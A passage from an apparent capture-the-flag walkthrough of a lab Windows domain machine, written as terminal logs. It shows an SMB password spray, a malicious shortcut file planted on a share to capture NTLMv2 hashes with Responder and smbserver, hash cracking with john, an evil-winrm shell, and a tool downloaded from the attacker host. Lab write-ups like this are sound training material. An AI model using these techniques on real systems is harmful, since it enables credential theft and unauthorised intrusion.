+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:admin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:administrator',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:marketing',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:12345678',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:1234',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:12345',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:qwerty',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:webadmin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:webmaster',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:maintenance',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:techsupport',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:letmein',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:logon',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:Passw@rd',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghancha:alpine',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:root',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:toor',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:raspberry',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:dietpi',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:test',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:uploader',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:password',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:admin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:administrator',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:marketing',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:12345678',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:1234',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:12345',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:qwerty',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:webadmin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:webmaster',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:maintenance',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:techsupport',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:letmein',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:logon',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:Passw@rd',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\meghanhol:alpine',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:root',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:toor',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:raspberry',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:dietpi',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:test',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:uploader',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:password',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:admin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:administrator',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:marketing',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:12345678',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:1234',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:12345',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:qwerty',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:webadmin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:webmaster',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:maintenance',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:techsupport',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:letmein',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:logon',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:Passw@rd',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\michellewat:alpine',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:root',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:toor',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:raspberry',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:dietpi',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:test',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:uploader',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:password',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:admin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:administrator',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:marketing',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:12345678',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:1234',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:12345',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:qwerty',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:webadmin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:webmaster',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:maintenance',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:techsupport',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:letmein',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:logon',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:Passw@rd',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\miriamwar:alpine',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:root',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:toor',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:raspberry',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:dietpi',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:test',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:uploader',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:password',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:admin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:administrator',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:marketing',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:12345678',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:1234',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:12345',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:qwerty',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:webadmin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:webmaster',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:maintenance',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:techsupport',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:letmein',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\myrtleowe:logon',
+[+] 10.10.242.97:445      - 10.10.242.97:445 - Success: '.\myrtleowe:Passw@rd'
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:root',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:toor',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:raspberry',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:dietpi',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:test',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:uploader',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:password',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:admin',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:administrator',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:marketing',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:12345678',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:1234',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:12345',
+[-] 10.10.242.97:445      - 10.10.242.97:445 - Failed: '.\nataliearm:qwerty',
+^C[*] 10.10.242.97:445      - Caught interrupt from the console...
+[*] Auxiliary module execution completed
+
+after 25 min
+
+myrtleowe:Passw@rd
+```
+```text
+┌──(kali㉿kali)-[/usr/share/seclists/Passwords/Common-Credentials]
+└─$ smbmap -u myrtleowe -p Passw@rd -H 10.10.242.97
+[+] IP: 10.10.242.97:445        Name: set.windcorp.thm                                  
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        E$                                                      NO ACCESS       Default share
+        Files                                                   READ ONLY
+        IPC$                                                    READ ONLY       Remote IPC
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ smbclient \\\\10.10.242.97\\Files -U myrtleowe
+Password for [WORKGROUP\myrtleowe]: Passw@rd
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Tue Jun 16 17:08:26 2020
+  ..                                  D        0  Tue Jun 16 17:08:26 2020
+  Info.txt                            A      123  Tue Jun 16 17:57:12 2020
+
+                10328063 blocks of size 4096. 6184765 blocks available
+smb: \> get Info.txt 
+getting file \Info.txt of size 123 as Info.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+smb: \> exit
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ cat Info.txt       
+Zip and save your project files here. 
+We will review them
+
+BTW.
+Flag1: THM{4c66e2b8d4c45a65e6a7d0c7ad4a5d7ff245dc14}
+
+go to https://www.mamachine.org/mslink/
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ tar -xzvf mslink_v1.3.tar.gz
+
+Este comando extraerá el contenido del archivo `mslink_v1.3.tar.gz` en el directorio actual. La opción `-x` indica que se debe extraer el archivo, la opción `-z` indica que se debe descomprimir un archivo comprimido con gzip, y la opción `-v` indica que se deben mostrar los mensajes de progreso mientras se extrae el archivo.
+
+mslink_v1.3/
+mslink_v1.3/mslink
+mslink_v1.3/Makefile
+mslink_v1.3/README
+mslink_v1.3/mslink.c
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ ls
+Info.txt  mslink_v1.3  mslink_v1.3.tar.gz  users_final.txt  users.xml
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ cd mslink_v1.3
+```
+```text
+┌──(kali㉿kali)-[~/Set/mslink_v1.3]
+└─$ ls
+Makefile  mslink  mslink.c  README
+```
+```text
+┌──(kali㉿kali)-[~/Set/mslink_v1.3]
+└─$ sudo ./mslink -l lala -n witty -i \\\\10.10.242.97\\share -o witty.lnk
+[sudo] password for kali: 
+Création d'un raccourci de type "dossier local" avec pour cible lala 
+zsh: segmentation fault  sudo ./mslink -l lala -n witty -i \\\\10.10.242.97\\share -o witty.lnk
+```
+```text
+┌──(kali㉿kali)-[~/Set/mslink_v1.3]
+└─$ ls
+Makefile  mslink  mslink.c  README  witty.lnk
+```
+```text
+┌──(kali㉿kali)-[~/Set/mslink_v1.3]
+└─$ zip hook.zip witty.lnk 
+  adding: witty.lnk (stored 0%)
+
+not work download version escrita en bash like this
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ chmod +x mslink_v1.3.sh
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ./mslink_v1.3.sh -l notimportant -n hook -i \\\\10.8.19.103\\share -o hook.lnk
+Création d'un raccourci de type "dossier local" avec pour cible notimportant
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ mv hook.lnk ../Set
+```
+```text
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cd ../Set
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ ls      
+hook.lnk  Info.txt  mslink_v1.2  mslink_v1.2.tar.gz  users_final.txt  users.xml
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ rm -r mslink_v1.2       
+rm: remove write-protected regular empty file 'mslink_v1.2/witty.lnk'? yes
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ rm -r mslink_v1.2.tar.gz
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ ls -lah 
+total 36K
+drwxr-xr-x   2 kali kali 4.0K Jan  2 12:21 .
+drwxr-xr-x 106 kali kali 4.0K Jan  2 12:18 ..
+-rw-r--r--   1 kali kali  165 Jan  2 12:19 hook.lnk
+-rw-r--r--   1 kali kali  123 Jan  2 11:42 Info.txt
+-rw-r--r--   1 kali kali 1.2K Jan  2 10:42 users_final.txt
+-rw-r--r--   1 kali kali  13K Jan  2 10:29 users.xml
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ zip hook.zip hook.lnk 
+  adding: hook.lnk (deflated 42%)
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ smbclient \\\\10.10.242.97\\Files -U myrtleowe
+Password for [WORKGROUP\myrtleowe]:
+Try "help" to get a list of possible commands.
+smb: \> put hook.zip
+putting file hook.zip as \hook.zip (0.4 kb/s) (average 0.4 kb/s)
+smb: \> ls
+  .                                   D        0  Mon Jan  2 12:23:47 2023
+  ..                                  D        0  Mon Jan  2 12:23:47 2023
+  hook.zip                            A      261  Mon Jan  2 12:23:47 2023
+  Info.txt                            A      123  Tue Jun 16 17:57:12 2020
+
+                10328063 blocks of size 4096. 6184274 blocks available
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ sudo responder -I tun0
+[sudo] password for kali: 
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.3.0
+
+  To support this project:
+  Patreon -> https://www.patreon.com/PythonResponder
+  Paypal  -> https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.8.19.103]
+    Responder IPv6             [fe80::7e18:39ac:d2c6:31b6]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-N9R65QVOOEA]
+    Responder Domain Name      [Z4GF.LOCAL]
+    Responder DCE-RPC Port     [48636]
+
+[+] Listening for events...                                                                                   
+
+[SMB] NTLMv2-SSP Client   : 10.10.242.97
+[SMB] NTLMv2-SSP Username : SET\MichelleWat
+[SMB] NTLMv2-SSP Hash     : MichelleWat::SET:58f0e792208dabc9:D563BF18F3FC74B57D34C71C1C493176:0101000000000000808EACFBA41ED9018E8935FEE9DD805100000000020008005A0034004700460001001E00570049004E002D004E003900520036003500510056004F004F004500410004003400570049004E002D004E003900520036003500510056004F004F00450041002E005A003400470046002E004C004F00430041004C00030014005A003400470046002E004C004F00430041004C00050014005A003400470046002E004C004F00430041004C0007000800808EACFBA41ED901060004000200000008003000300000000000000000000000002000005E431CA5EBD98F5126348040BDC5D09560C5EF67524F061E44D359BA4CED24280A001000000000000000000000000000000000000900200063006900660073002F00310030002E0038002E00310039002E003100300033000000000000000000                                               
+[*] Skipping previously captured hash for SET\MichelleWat
+[*] Skipping previously captured hash for SET\MichelleWat
+
+:) 
+
+let's use smbserver.py too
+
+smb: \> put hook.zip
+putting file hook.zip as \hook.zip (0.4 kb/s) (average 0.4 kb/s)
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ sudo smbserver.py -smb2support share .
+Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.242.97,50316)
+[*] AUTHENTICATE_MESSAGE (SET\MichelleWat,SET)
+[*] User SET\MichelleWat authenticated successfully
+[*] MichelleWat::SET:aaaaaaaaaaaaaaaa:a6c7a63c90fbd22819a7a6ece456ed9d:01010000000000000037016dcf1ed90100c26a5aa9dc4eaf00000000010010006d005300560044006c00660042006800030010006d005300560044006c00660042006800020010006600610044006200460077004b007500040010006600610044006200460077004b007500070008000037016dcf1ed901060004000200000008003000300000000000000000000000002000005e431ca5ebd98f5126348040bdc5d09560c5ef67524f061e44d359ba4ced24280a001000000000000000000000000000000000000900200063006900660073002f00310030002e0038002e00310039002e003100300033000000000000000000
+[*] Closing down connection (10.10.242.97,50316)
+[*] Remaining connections []
+[*] Incoming connection (10.10.242.97,50317)
+[*] AUTHENTICATE_MESSAGE (SET\MichelleWat,SET)
+[*] User SET\MichelleWat authenticated successfully
+[*] MichelleWat::SET:aaaaaaaaaaaaaaaa:6994eb7354f2bd3f948ebeeab6c61ca8:01010000000000000037016dcf1ed901ccac7e5feabc2eb100000000010010006d005300560044006c00660042006800030010006d005300560044006c00660042006800020010006600610044006200460077004b007500040010006600610044006200460077004b007500070008000037016dcf1ed901060004000200000008003000300000000000000000000000002000005e431ca5ebd98f5126348040bdc5d09560c5ef67524f061e44d359ba4ced24280a001000000000000000000000000000000000000900200063006900660073002f00310030002e0038002e00310039002e003100300033000000000000000000
+[*] Closing down connection (10.10.242.97,50317)
+[*] Remaining connections []
+[*] Incoming connection (10.10.242.97,50318)
+[*] AUTHENTICATE_MESSAGE (SET\MichelleWat,SET)
+[*] User SET\MichelleWat authenticated successfully
+[*] MichelleWat::SET:aaaaaaaaaaaaaaaa:f3319de1a8c89bc7216bc5183bb9f26a:010100000000000080cd996dcf1ed901d8818a24aad333d300000000010010006d005300560044006c00660042006800030010006d005300560044006c00660042006800020010006600610044006200460077004b007500040010006600610044006200460077004b0075000700080080cd996dcf1ed901060004000200000008003000300000000000000000000000002000005e431ca5ebd98f5126348040bdc5d09560c5ef67524f061e44d359ba4ced24280a001000000000000000000000000000000000000900200063006900660073002f00310030002e0038002e00310039002e003100300033000000000000000000
+[*] Closing down connection (10.10.242.97,50318)
+[*] Remaining connections []
+
+now using john
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ nano hash_michelle
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_michelle 
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+!!!MICKEYmouse   (MichelleWat)     
+1g 0:00:00:14 DONE (2023-01-02 12:28) 0.06910g/s 991275p/s 991275c/s 991275C/s !)(OPPQR..*7¡Vamos!
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed.
+
+MichelleWat:!!!MICKEYmouse
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ evil-winrm -i 10.10.242.97 -u MichelleWat -p '!!!MICKEYmouse' -N
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completion is disabled
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\MichelleWat\Documents> ls
+*Evil-WinRM* PS C:\Users\MichelleWat\Documents> cd ..\Desktop
+*Evil-WinRM* PS C:\Users\MichelleWat\Desktop> ls
+
+    Directory: C:\Users\MichelleWat\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        6/16/2020   2:07 PM             52 Flag2.txt
+
+*Evil-WinRM* PS C:\Users\MichelleWat\Desktop> type Flag2.txt
+Flag2: THM{690798b1780964f5f51cebd854da5a2ea236ebb5}
+```
+```text
+┌──(kali㉿kali)-[/tmp/CVE-2021-1675]
+└─$ ls
+CVE-2021-1675.ps1  nightmare-dll  README.md
+```
+
+## Privilege Escalation
+```text
+┌──(kali㉿kali)-[/tmp/CVE-2021-1675]
+└─$ cp CVE-2021-1675.ps1 /home/kali/Set  
+
+*Evil-WinRM* PS C:\Users\MichelleWat\Desktop> upload CVE-2021-1675.ps1
+Info: Uploading CVE-2021-1675.ps1 to C:\Users\MichelleWat\Desktop\CVE-2021-1675.ps1
+
+Error: [WinRM::FS::Core::FileTransporter] Upload failed (exitcode: 0), but stderr present
+Cannot invoke method. Method invocation is supported only on core types in this language mode.                
+At line:51 char:12                                                                                            
++     return $ExecutionContext.SessionState.Path.GetUnresolvedProviderP ...                                   
++            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~                                       
+    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException                                      
+    + FullyQualifiedErrorId : MethodInvocationNotSupportedInConstrainedLanguage                               
+Cannot bind argument to parameter 'Path' because it is null.                                                  
+At line:19 char:18                                                                                            
++     if(Test-Path $dst -PathType Container) {                                                                
++                  ~~~~                                                                                       
+    + CategoryInfo          : InvalidData: (:) [Test-Path], ParameterBindingValidationException               
+    + FullyQualifiedErrorId : ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.TestPathCommand                                                                                                  
+Cannot bind argument to parameter 'Path' because it is null.                                                  
+At line:24 char:41                                                                                            
++       chk_exists = ($exists = Test-Path $dst -PathType Leaf)                                                
++                                         ~~~~                                                                
+    + CategoryInfo          : InvalidData: (:) [Test-Path], ParameterBindingValidationException               
+    + FullyQualifiedErrorId : ParameterArgumentValidationErrorNullNotAllowed,Microsoft.PowerShell.Commands.TestPathCommand                                                                                                  
+: ["/usr/share/rubygems-integration/all/gems/winrm-fs-1.3.5/lib/winrm-fs/core/file_transporter.rb:408:in `parse_response'", "/usr/share/rubygems-integration/all/gems/winrm-fs-1.3.5/lib/winrm-fs/core/file_transporter.rb:224:in `check_files'", "/usr/share/rubygems-integration/all/gems/winrm-fs-1.3.5/lib/winrm-fs/core/file_transporter.rb:91:in `block in upload'", "/usr/lib/ruby/3.0.0/benchmark.rb:293:in `measure'", "/usr/share/rubygems-integration/all/gems/winrm-fs-1.3.5/lib/winrm-fs/core/file_transporter.rb:89:in `upload'", "/usr/share/rubygems-integration/all/gems/winrm-fs-1.3.5/lib/winrm-fs/file_manager.rb:143:in `block in upload'", "/usr/share/rubygems-integration/all/gems/winrm-2.3.6/lib/winrm/connection.rb:42:in `shell'", "/usr/share/rubygems-integration/all/gems/winrm-fs-1.3.5/lib/winrm-fs/file_manager.rb:140:in `upload'", "/usr/share/rubygems-integration/all/gems/evil-winrm-3.4/bin/evil-winrm:596:in `block in main'", "/usr/share/rubygems-integration/all/gems/winrm-2.3.6/lib/winrm/connection.rb:42:in `shell'", "/usr/share/rubygems-integration/all/gems/evil-winrm-3.4/bin/evil-winrm:521:in `main'", "/usr/share/rubygems-integration/all/gems/evil-winrm-3.4/bin/evil-winrm:974:in `<top (required)>'", "/usr/bin/evil-winrm:25:in `load'", "/usr/bin/evil-winrm:25:in `<main>'"]                             
+
+Error: Upload failed. Check filenames or paths
+
+maybe winpeas
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ cp /home/kali/Downloads/Enterprise/winPEASany_ofs.exe winPEASany_ofs.exe
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ ls
+CVE-2021-1675.ps1  hook.lnk  Info.txt         users.xml
+hash_michelle      hook.zip  users_final.txt  winPEASany_ofs.exe
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ chmod +x winPEASany_ofs.exe
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ ls
+CVE-2021-1675.ps1  hook.lnk  Info.txt         users.xml
+hash_michelle      hook.zip  users_final.txt  winPEASany_ofs.exe
+```
+```text
+┌──(kali㉿kali)-[~/Set]
+└─$ python3 -m http.server 1337                                                    
+Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
+10.10.242.97 - - [02/Jan/2023 12:46:19] "GET /winPEASany_ofs.exe HTTP/1.1" 200 -
+
+*Evil-WinRM* PS C:\Users\MichelleWat\Desktop> Invoke-WebRequest http://10.8.19.103:1337/winPEASany_ofs.exe -o winPEASany_ofs.exe
+*Evil-WinRM* PS C:\Users\MichelleWat\Desktop> ls
+
+    Directory: C:\Users\MichelleWat\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        6/16/2020   2:07 PM             52 Flag2.txt
+-a----         1/2/2023   9:46 AM        1829376 winPEASany_ofs.exe
+
+*Evil-WinRM* PS C:\Users\MichelleWat\Desktop> .\winPEASany_ofs.exe
+ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
+
+               ((((((((((((((((((((((((((((((((                                                               
+        (((((((((((((((((((((((((((((((((((((((((((                                                           
+      ((((((((((((((**********/##########(((((((((((((                                                        
+    ((((((((((((********************/#######(((((((((((                                                       
+    ((((((((******************/@@@@@/****######((((((((((                                                     
+    ((((((********************@@@@@@@@@@/***,####((((((((((                                                   
+    (((((********************/@@@@@%@@@@/********##(((((((((                                                  
+    (((############*********/%@@@@@@@@@/************((((((((                                                  
+    ((##################(/******/@@@@@/***************((((((                                                  
+    ((#########################(/**********************(((((                                                  
+    ((##############################(/*****************(((((                                                  
+    ((###################################(/************(((((                                                  
+    ((#######################################(*********(((((                                                  
+    ((#######(,.***.,(###################(..***.*******(((((                                                  
+    ((#######*(#####((##################((######/(*****(((((                                                  
+    ((###################(/***********(##############()(((((                                                  
+    (((#####################/*******(################)((((((                                                  
+    ((((############################################)((((((                                                   
+    (((((##########################################)(((((((                                                   
+    ((((((########################################)(((((((                                                    
+    ((((((((####################################)((((((((                                                     
+    (((((((((#################################)(((((((((                                                      
+        ((((((((((##########################)(((((((((                                                        
+              ((((((((((((((((((((((((((((((((((((((                                                          
+                 ((((((((((((((((((((((((((((((                                                               
+
+ADVISORY: winpeas should be used for authorized penetration testing and/or educational purposes only.Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own devices and/or with the device owner's permission.                                                         
+                                                                                                              
+  WinPEAS-ng by @carlospolopm                                                                                 
+
+       /---------------------------------------------------------------------------------\                    
+       |                             Do you like PEASS?                                  |                    
+       |---------------------------------------------------------------------------------|                    
